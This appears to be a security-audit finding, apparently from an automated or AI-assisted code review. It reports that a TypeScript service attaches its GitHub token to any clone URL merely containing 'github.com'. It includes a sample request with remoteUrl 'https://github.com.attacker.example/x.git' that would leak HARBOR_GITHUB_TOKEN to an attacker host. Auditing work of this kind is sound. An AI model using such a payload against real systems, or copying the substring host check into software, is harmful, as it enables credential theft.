input.command: cat -n src/git-auth.ts; cat -n src/worktree.ts; ls src

content.text: Check where repos are registered and whether remoteUrl is validated.

input.reason: At src/git-auth.ts:8, gitAuthArgs decides whether to attach the service token with `remoteUrl.includes("github.com")`. That is a substring check on the whole URL. It does not parse the URL or compare the hostname. When it matches, the function returns `-c http.extraHeader=Authorization: Bearer ${token}`. In src/worktree.ts:15, cloneRepo passes repo.remoteUrl to gitAuthArgs together with SERVICE_TOKEN, which config.ts:4 reads from HARBOR_GITHUB_TOKEN, and then runs `git clone` against that same URL. The only caller is registerRepo in src/routes.ts:19-22. It takes remoteUrl from req.body and checks only that the value is non-empty before calling cloneRepo. There is no allowlist, no URL parsing and no host validation anywhere on this path. Any URL that contains "github.com" anywhere gets the token, and git sends that header to whatever host the URL names. Examples are `https://github.com.evil.example/x.git` and `https://evil.example/github.com/x.git`. F08, F09 and F18 all describe this same defect.
input.failure_scenario: An authenticated user calls registerRepo with body {id: "x", remoteUrl: "https://github.com.attacker.example/x.git"}. routes.ts passes the URL to cloneRepo without validating it. gitAuthArgs matches the substring "github.com" and returns the Authorization header option. git then clones from github.com.attacker.example, and each HTTPS request carries `Authorization: Bearer <HARBOR_GITHUB_TOKEN>`. The attacker's server logs the header and ends up with the service's GitHub token.
input.severity_reason: Any user who can register a repository can steal the service-wide GitHub credential with one request. With that token they get whatever GitHub access the service has, across every repository it can reach. It is an easily exploited credential leak.
